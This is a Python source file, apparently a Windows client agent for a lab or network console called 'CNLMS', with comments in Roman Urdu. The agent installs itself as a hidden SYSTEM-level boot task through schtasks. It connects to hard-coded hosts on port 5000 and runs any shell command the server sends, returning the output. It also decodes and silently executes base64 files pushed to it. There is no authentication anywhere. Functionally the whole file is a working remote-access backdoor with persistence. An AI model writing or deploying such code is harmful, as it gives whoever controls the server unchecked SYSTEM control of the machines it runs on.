import os
import sys
import socket
import time
import json
import base64
import subprocess

CONFIG_FILE_NAME = "config.json"
DEFAULT_SERVER_HOSTS = ["127.0.0.1", "DESKTOP-2F6GJ4O", "DESKTOP-CSNCAQN"]
PORT = 5000
DELIMITER = "<END_OF_MSG>"

def get_executable_dir():
    """Ensure karta hai ke exact folder path mile jahan .exe pari hui hai"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(sys.argv[0]))

def set_auto_startup():
    """Client ko Windows Task Scheduler me register karta hai taake restart par automatic bina UAC prompt ke chale"""
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
            
        task_name = "CNLMS_Background_Agent"
        
        # Windows official scheduler command (Highest rights aur System privileges ke sath boot-up persistence)
        cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe_path}\\"" /sc onstart /ru "SYSTEM" /rl highest /f'
        
        # Command ko background me silently execute karna bina console window blink kiye
        subprocess.run(
            cmd, 
            shell=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL, 
            creationflags=0x08000000
        )
        print("[+] Success: Client scheduled in Windows Task Scheduler for permanent auto-boot!")
    except Exception as e:
        print(f"[-] Scheduling Failed: {e}")

def get_server_ips() -> list:
    """Config file ko exact executable directory se absolute path par lookup karta hai"""
    config_path = os.path.join(get_executable_dir(), CONFIG_FILE_NAME)
    
    if os.path.exists(config_path):
        try:
            with open(config_path, "r") as f:
                data = json.load(f)
                hosts = data.get("server_hosts", DEFAULT_SERVER_HOSTS)
                if isinstance(hosts, str):
                    return [hosts]
                return hosts
        except:
            return DEFAULT_SERVER_HOSTS
    else:
        try:
            with open(config_path, "w") as f:
                json.dump({"server_hosts": DEFAULT_SERVER_HOSTS, "port": PORT}, f, indent=4)
        except:
            pass
        return DEFAULT_SERVER_HOSTS

def execute_shell_command(command: str) -> str:
    try:
        output = subprocess.check_output(
            command, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            stdin=subprocess.DEVNULL,
            creationflags=0x08000000
        )
        return output.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='ignore')
    except Exception as ex:
        return f"Execution Error: {str(ex)}"

def start_client_agent():
    # Windows boot hone ke baad socket layers aur system adapters stable hone ka 6 seconds delay wait
    time.sleep(6)
    
    # Task Scheduler injection trigger
    set_auto_startup()
    
    while True:
        server_list = get_server_ips()
        print(f"[System] Targeted Server Destinations: {server_list}:{PORT}")
        
        connection_established = False
        
        for server_ip in server_list:
            try:
                client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_sock.settimeout(4)
                
                print(f"[~] Attempting connection to remote console node ({server_ip})...")
                client_sock.connect((server_ip, PORT))
                
                client_sock.settimeout(None)
                print(f"[+] Connection established successfully with Server Console: {server_ip}!")
                connection_established = True
                
                client_buffer = ""
                
                while True:
                    data = client_sock.recv(65536)
                    if not data:
                        print("[-] Server disconnected dynamically.")
                        break
                    
                    client_buffer += data.decode('utf-8', errors='ignore')
                    
                    while DELIMITER in client_buffer:
                        raw_msg, client_buffer = client_buffer.split(DELIMITER, 1)
                        
                        try:
                            msg = json.loads(raw_msg.strip())
                            msg_type = msg.get("type")
                            
                            if msg_type == "command":
                                cmd_data = msg.get("data", "")
                                result_output = execute_shell_command(cmd_data)
                                response = json.dumps({"type": "result", "data": result_output}) + DELIMITER
                                client_sock.sendall(response.encode('utf-8'))
                            
                            elif msg_type == "file":
                                filename = msg.get("filename", "deployed_tool.exe")
                                b64_data = msg.get("data", "")
                                silent_flag = msg.get("silent_flag", "")
                                
                                target_dir = r"C:\CNLMS\Received"
                                if not os.path.exists(target_dir):
                                    os.makedirs(target_dir)
                                    
                                filepath = os.path.join(target_dir, filename)
                                file_bytes = base64.b64decode(b64_data.encode('utf-8'))
                                with open(filepath, "wb") as f:
                                    f.write(file_bytes)
                                
                                print(f"[+] File saved at {filepath}. Starting silent installation...")
                                
                                if silent_flag:
                                    install_cmd = f'"{filepath}" {silent_flag}'
                                else:
                                    install_cmd = f'"{filepath}"'
                                    
                                install_output = execute_shell_command(install_cmd)
                                success_msg = json.dumps({
                                    "type": "result", 
                                    "data": f"[Success] File '{filename}' installed successfully!\nOutput:\n{install_output}"
                                }) + DELIMITER
                                client_sock.sendall(success_msg.encode('utf-8'))
                                
                        except Exception as json_err:
                            print(f"[-] Processing error: {json_err}")
                            continue
                            
            except (socket.error, OSError) as net_err:
                print(f"[-] Node {server_ip} unreachable. Switching context...")
                try:
                    client_sock.close()
                except:
                    pass
                continue
                
            except Exception as general_err:
                print(f"[-] Runtime error loop: {general_err}")
                time.sleep(2)
                break
        
        if not connection_established:
            print("[-] All designated server nodes are currently offline. Full network re-scan in 8 seconds...")
            time.sleep(8)

if __name__ == "__main__":
    start_client_agent()